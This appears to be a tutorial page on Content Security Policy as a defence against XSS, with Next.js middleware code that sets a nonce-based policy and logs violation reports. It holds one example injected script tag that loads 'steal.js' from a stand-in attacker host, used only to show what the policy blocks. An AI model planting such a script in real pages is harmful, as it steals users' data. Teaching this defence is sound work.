CSP — a second layer of defence against XSS and data injection

Even if an attacker injects HTML/JS, CSP blocks execution of unauthorised scripts. CSP is delivered as an HTTP response header (or meta tag) and tells the browser what sources are allowed for each resource type.

How it stops XSS
Attacker injects: <script src="evil.com/steal.js">

Without CSP → browser loads it.
With script-src 'self' → browser blocks evil.com script, logs violation.
Deployment modes
Enforce: violations are blocked + reported
Report-Only: Content-Security-Policy-Report-Only — violations reported but not blocked (use to test before enforcing)
Nonce: per-request nonce allows specific inline scripts

        Directive

        Common values
      

      
default-srcFallback for all fetch directives'self' — only same origin

      
script-srcJavaScript sources'self' 'nonce-{base64}' cdn.com

img-srcImage sources'self' data: https://cdn.example.com

CSP with nonce + Next.js middleware + violation reporting

    
// ─── Next.js middleware.ts — generate per-request nonce ───
import { NextResponse } from 'next/server';
import { randomBytes } from 'crypto';

export function middleware(req) {
  const nonce = randomBytes(16).toString('base64');
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,  // nonce for inline scripts
    `style-src 'self' 'unsafe-inline'`,     // CSS-in-JS usually needs this
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `report-uri /api/csp-report`
  ].join(';');

  const res = NextResponse.next();
  res.headers.set('Content-Security-Policy', csp);
  res.headers.set('x-nonce', nonce); // pass nonce to layout
  return res;
}

// ─── _document.tsx — use nonce on inline scripts ───
<Script nonce={nonce} strategy="beforeInteractive">
  window.__APP_ENV__ = JSON.stringify(publicEnv);
</Script>

// ─── CSP violation report endpoint ───
export async function POST(req: Request) {
  const report = await req.json();
  logger.warn('CSP violation', report['csp-report']);
  return Response.json({ ok: true });
}
